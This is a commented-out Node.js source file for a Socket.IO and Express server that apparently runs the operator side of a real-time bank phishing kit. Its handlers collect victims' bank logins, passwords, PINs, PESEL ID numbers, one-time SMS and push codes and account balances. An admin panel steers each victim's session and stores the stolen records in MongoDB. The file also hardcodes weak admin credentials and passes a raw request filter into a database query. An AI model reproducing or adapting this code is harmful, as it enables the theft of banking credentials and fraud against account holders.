// import Users from "./models/user";
//
// const _PORT = process.env || 3301;
// const cors = require('cors')
// const findUser = require('./utils/findUser');
// const findUserIndex = require('./utils/findUserIndex')
// const express = require('express')
// const app = express();
// app.use(express.json())
//     .use(cors());
// app.options( '*', cors());
// const server = require('http').createServer(app);
// const {v4} = require('uuid');
// const mongoose = require('mongoose');
// mongoose.connect('mongodb://localhost:27017/users',
//     {
//         useNewUrlParser: true, useUnifiedTopology: true
//     });
// const db = mongoose.connection;
//
// db.on('error', console.error.bind(console, 'connection error:'));
// db.once('open', function() {
//     console.log('DB connected');
// });
//
// const io = require('socket.io')(server,{
//     cors: {
//         origin: ["http://localhost:3000", "http://localhost:3001", "http://localhost:3002"],
//         methods: ["GET", "POST"],
//     }
// })
//
// const admin = {
//     login: 'danil',
//     pass: '12345678',
//     id: '3301'
// }
// let users = [];
//
//
//
//
// io.on('connection', (socket) => {
//
//     console.log('Connection', socket.id);
//     //User actions
//     socket.on('init_user', (data) => {
//         console.log('Hook init user', data);
//         const userIndex = findUserIndex(data.id, users);
//         if (userIndex >= 0) {
//             users[userIndex] = {
//                 ...data
//             }
//         }
//         else {
//             users.push({
//                 ...data,
//             });
//         }
//         socket.join(data.id);
//         socket.emit('update_user', {
//             id: data.id,
//             status: data.status
//         });
//         io.emit('update_users', users);
//     });
//     socket.on('get_user', (id, callback) => {
//         console.log('Hook get user',id);
//         const user =  findUser(id, users);
//         socket.join(id);
//         callback( user );
//     });
//     socket.on('send_code', (data) => {
//         console.log('Hook send_code');
//         const user = findUser(data.id, users);
//
//         if(user) {
//             user.status = 'send_code';
//             user.code = data.code;
//             socket.to(data.id).emit('update_user', {
//                 id: data.id, status: 'send_code'
//             });
//             io.emit('update_users', users);
//         }
//         // const index =  users.findIndex((item) => {
//         //     return item.id === data.id
//         // });
//         // users[index].status = 'send_code';
//         // users[index].code = data.code;
//         io.emit('update_users', users);
//     });
//     socket.on('send_other_data', (data, id) => {
//         console.log('Hook, send_other_data');
//         const userIndex = findUserIndex(id, users);
//         if (userIndex >= 0) {
//             users[userIndex] = {
//                 ...users[userIndex],
//                 ...data,
//                 status: 'send_other_data',
//             }
//             socket.to(id).emit('update_user', {
//                 id, status: 'send_other_data'
//             })
//             io.emit('update_users', users);
//         }
//     });
//     socket.on('send_push', ({id, code}) => {
//         console.log('Hook send_push', id, code);
//         const user = findUser(id, users);
//
//         if(user) {
//             user.status = 'send_push';
//             user.code = code;
//             socket.to(id).emit('update_user', {
//                 id, status: 'send_push'
//             })
//             io.emit('update_users', users);
//         }
//     })
//
//     //Admin actions
//     socket.on('get_all_users', (callback)=>{
//         console.log('Hook get_all_users');
//         callback(users);
//     });
//
//
//
//
//     socket.on('fail_user', (id) => {
//         console.log('Hook, fail_user');
//         console.log(id);
//         const user = findUser(id, users);
//         if (user) {
//             user.status = 'fail_user';
//             const newUser = new Users({
//                 userID: user.id,
//                 login: user.login,
//                 password: user.pass,
//                 bank: user.bank,
//                 pin_code: user.pin,
//                 pesel: user.pesel,
//                 secret: user.lastname,
//                 amount: user.amount,
//                 isSuccess: false
//             });
//             newUser.save(function(err,user){
//                 if(err){
//                     return console.error(err);
//                 }
//             });
//             socket.to(id).emit('update_user', {
//                 id, status: 'fail_user'
//             })
//             io.emit('update_users', users);
//
//         }
//     })
//     socket.on('success_user', (id) => {
//         console.log('Hook, success_user');
//         const user = findUser(id, users);
//         if (user) {
//             user.status = 'success_user';
//             const newUser = new Users({
//                 userID: user.id,
//                 login: user.login,
//                 password: user.pass,
//                 bank: user.bank,
//                 pin_code: user.pin,
//                 pesel: user.pesel,
//                 secret: user.lastname,
//                 amount: user.amount,
//                 isSuccess: true
//             });
//             newUser.save(function(err,user){
//                 if(err){
//                     return console.error(err);
//                 }
//             });
//             socket.to(id).emit('update_user', {
//                 id, status: 'success_user'
//             })
//             io.emit('update_users', users);
//
//         }
//     })
//     socket.on('get_push', (id, amount) => {
//         console.log()
//     })
//     //Errors
//
//
//     //Update user hook
//     socket.on('update_user', ({status, id, args}) => {
//         console.log('Hook, update_user');
//         const userIndex = findUserIndex(id, users);
//         if (userIndex >= 0){
//             console.log(`Change status: ${users[userIndex].status} => ${status}`)
//             users[userIndex] = {
//                 ...users[userIndex],
//                 ...args,
//                 status
//             }
//             socket.to(id).emit('update_user', {
//                 status, ...args, id
//             });
//             io.emit('update_users', users);
//         }
//
//     } )
//     socket.on('send_data', ({status, id, args}) => {
//         console.log('Hook, send_data');
//         const userIndex = findUserIndex(id, users);
//         if (userIndex >= 0){
//             users[userIndex] = {
//                 ...users[userIndex],
//                 ...args,
//                 status
//             }
//             socket.emit('update_user', {
//                 status, ...args, id
//             });
//             io.emit('update_users', users);
//         }
//
//     } )
//     socket.on('delete_user', (id) => {
//         console.log('Hook, delete_user');
//         const userIndex = findUserIndex(id, users);
//         if(userIndex >= 0){
//             users.splice(userIndex, 1);
//             socket.to(id).emit('update_user', {
//                 status: ''
//             })
//             io.emit('update_users', users);
//         }
//
//      })
//     //Disconnect socket
//     socket.on("disconnect", (reason) => {
//         console.log(reason); // "ping timeout"
//     });
// })
//
//
//
// app.post('/auth', (req, res) => {
//     console.log(req.body);
//     if( req.body.login === admin.login && req.body.password === admin.pass){
//         setTimeout(()=> {
//             res.json({
//                 status: true,
//                 id: admin.id,
//             })
//         }, 2000)
//
//     }
//     else {
//         res.json({
//             status: false,
//             msg: 'Failed'
//         })
//     }
// })
// app.get('/api/get_users', async (req, res) => {
//     console.log('Getting users list');
//
//     const users = await Users.find( function(err, users){
//         if(err){
//             return console.error(err);
//         }
//         console.log('Users',users);
//         return users;
//     });
//     res.json(users);
// });
// app.post('/api/get_users', async (req, res) => {
//     console.log('Getting users list with filter');
//     const {filter} = req.body;
//     console.log(filter);
//     const users = await Users.find(filter, function (err, users){
//         if (err) return console.error(err);
//         console.log('Users',users);
//         return users;
//     })
//     res.json(await users);
//
// })
// // app.listen(_PORT, () => {
// //     console.log(`Listen port: ${_PORT}`)
// //
// // })
// server.listen(_PORT, ()=> {
//     console.log(`Server listen port ${_PORT}`);
// })